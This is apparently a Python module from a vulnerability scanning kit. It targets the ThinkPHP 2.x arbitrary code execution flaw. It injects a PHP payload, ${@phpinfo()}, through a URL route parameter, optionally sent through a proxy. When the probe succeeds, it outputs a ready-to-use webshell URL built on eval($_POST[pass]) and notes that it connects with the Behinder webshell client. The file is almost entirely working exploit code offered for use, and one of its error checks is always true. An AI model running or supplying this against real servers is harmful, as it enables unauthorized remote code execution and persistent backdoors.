import requests
import time
from bs4 import BeautifulSoup
import logging

cdd=''
http = ''
https = ''
def dl13(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    url2='?s=/index/'
    url3 = url1 + url2
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa = requests.get(url3,cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if '系统发生错误' or '无法加载模块' or '错误' in cd.text:
            url4 = 'index.php?s=/index/index/name/$%7B@phpinfo()%7D'
            aa = requests.get(url1 + url4,cookies=s_cookie,proxies=proxies, timeout=5)
            aa.encoding = 'utf-8'
            cd = BeautifulSoup(aa.text, 'html.parser')
            if 'PHP Version' in cd.text:
                cdd='[+]漏洞存在:', url1 + 'index.php?s=/index/index/name/${@eval($_POST[pass])}\nps.冰蝎链接'
            else:
                cdd='[-]漏洞不存在'
        else:
            cdd='[-]报错失败'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jg4():
    global cdd
    return '--------------------------------------------------\n[ ThinkPHP 2.x 任意代码执行漏洞 ]\n\n'+ str (cdd)+'\n'
def u3(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)